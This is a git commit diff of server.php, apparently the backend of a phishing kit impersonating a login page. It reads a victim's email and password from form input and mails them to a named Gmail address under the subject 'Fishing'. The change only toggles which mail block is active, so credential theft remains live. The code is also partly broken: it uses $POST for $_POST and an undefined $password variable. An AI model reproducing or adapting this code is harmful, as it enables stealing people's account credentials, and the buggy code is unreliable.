63c11e787cf28ba7f2307ad2fe091901965b138f
intagram <68853920+intagram@users.noreply.github.com>
2020-08-23 19:59:33 +0400

    Update server.php

--- server.php
+++ server.php
@@ -4,26 +4,24 @@
 
 $mail = $POST['val'];
 $pass = $POST['val1'];
-$to      = 'narekxachatryan1998@gmail.com';
-$subject = "Fishing";
-$message = "email: ".$mail.' | '."password: ".$pass;
-$headers = 'loloya';
-
-mail($to, $subject, $message, $headers);
+// $to      = 'narekxachatryan1998@gmail.com';
+// $subject = "Fishing";
+// $message = "email: ".$mail.' | '."password: ".$pass;
+// mail($to, $subject, $message);
 
 
 
 
-// $to = 'narekxachatryan1998@gmail.com';
-// $subject = 'Fishing';
-// $message = 'Email: ' . $mail . ' | ' .'Password: '. $password;
-// // Sending email
-// if(mail($to, $subject, $message)){
-//     // echo 'Your mail has been sent successfully.';
+$to = 'narekxachatryan1998@gmail.com';
+$subject = 'Fishing';
+$message = $mail . ' | ' . $password;
+// Sending email
+if(mail($to, $subject, $message)){
+    echo 'Your mail has been sent successfully.';
 //     print $mail;
-// } else{
-//     echo 'Unable to send email. Please try again.';
-// }
+} else{
+    echo 'Unable to send email. Please try again.';
+}
 
 
 
